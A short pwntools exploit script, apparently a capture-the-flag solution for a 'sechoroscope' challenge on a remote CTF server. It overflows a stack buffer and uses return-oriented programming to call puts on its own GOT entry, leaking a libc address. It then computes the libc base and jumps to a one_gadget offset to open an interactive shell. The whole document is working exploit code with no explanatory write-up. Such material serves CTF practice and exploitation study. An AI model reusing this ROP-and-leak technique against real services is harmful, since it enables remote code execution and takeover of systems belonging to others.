from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)

if args.REMOTE:
   libc = ELF('libc6_2.27-3ubuntu1.5_amd64.so',checksec=False)
else:
   libc = ELF('libc6_2.33-6_amd64.so',checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('sechoroscope.sdc.tf', 1337)
    else:
        return process(e.path)

p = start()

def ret2_plt():
   pop_junk = p64(0x0400870)
   pop_rdi = p64(0x0400873)

   stage1 = pop_junk
   stage1 += p64(0xdeadbeef)
   stage1 += p64(0xbadc0d3)

   stage0 = pop_rdi
   stage0 +=p64(e.got['puts'])
   stage0 +=p64(e.plt['puts'])
   stage0 += p64(e.sym['main'])

   log.info("Clearing Corrupted Stack")
   p.recvuntil(b'To get started, tell us how you feel')
   p.sendline(stage0)
   p.recvuntil(b'have your very own horoscope')
   p.sendline(b'\n')
   p.recvuntil(b'have your very own horoscope')

   log.info("Leaking Libc; Returning to Main")
   p.sendline(b'6/1/22'+cyclic(114)+stage1)
   p.recvuntil(b'5 business days')
   p.recvline()
   leak=u64(p.recv(6)+b'\x00\x00')
   log.info("Libc Leak (puts): %s" %hex(leak))
   libc.address=leak-libc.sym['puts']
   log.info("Libc base address: %s" %hex(libc.address))

def ret2_onegadget():
   if args.REMOTE:
      one_gadget = p64(libc.address+0x4f302)
   else:
      one_gadget = p64(libc.address+0xcb5d0)

   p.recvuntil(b'have your very own horoscope')
   log.info("Returning to One Gadget")

   pad = b'6/1/22'
   pad += cyclic(34)
   pad += p64(0x0)*10 
   p.sendline(pad+one_gadget)
   p.interactive()

ret2_plt()
ret2_onegadget()

